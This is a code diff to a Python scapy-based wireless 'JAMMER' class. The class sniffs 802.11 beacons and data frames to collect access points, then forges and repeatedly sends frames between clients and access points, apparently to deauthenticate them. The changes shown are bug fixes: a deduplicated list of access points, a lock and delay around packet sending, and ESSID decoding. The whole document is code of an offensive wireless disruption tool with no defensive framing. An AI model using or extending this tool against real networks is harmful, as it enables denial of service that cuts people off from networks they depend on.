@@ -23,7 +23,8 @@ from scapy.layers.eap   import EAPOL
 
 class JAMMER:
 
-	__ACCESSPOINTS = set()
+	__ACCESSPOINTS = []
+	LOCK = threading.Semaphore(value=1)
 
 	def __init__(self, prs):
 		self.interface = prs.interface
@@ -43,7 +44,7 @@ class JAMMER:
 		layer = layers.getlayer(Dot11Elt, counter)
 		while layer:
 			if hasattr(layer, "ID") and layer.ID == 0:
-				essid = layer.info
+				essid = layer.info.decode('ascii')
 				break
 			else:
 				counter += 1
@@ -76,6 +77,7 @@ class JAMMER:
 			self.forge(receiver, sender)
 		)
 
+		self.LOCK.acquire()
 		for pkt in pkts:
 			sendp(
 				pkt,
@@ -83,6 +85,8 @@ class JAMMER:
 				count=self.packets,
 				verbose=False
 			)
+			time.sleep(1)
+		self.LOCK.release()
 			
 		essid = self.get_ess(sender, receiver)
 		pull.print("*",
@@ -149,12 +153,14 @@ class JAMMER:
 		if pkt.haslayer(Dot11Beacon):
 			macaddr = pkt.getlayer(Dot11FCS).addr2
 			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
-			self.__ACCESSPOINTS.add(
-					{
-						'bssid': macaddr,
-						'essid': essid
-					}
-				)
+			toappend = {
+				'bssid': macaddr,
+				'essid': essid
+			}
+			if toappend not in self.__ACCESSPOINTS:
+				self.__ACCESSPOINTS.append(
+						toappend
+					)
 		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2:
 			sender   = pkt.getlayer(Dot11FCS).addr2
 			receiver = pkt.getlayer(Dot11FCS).addr1
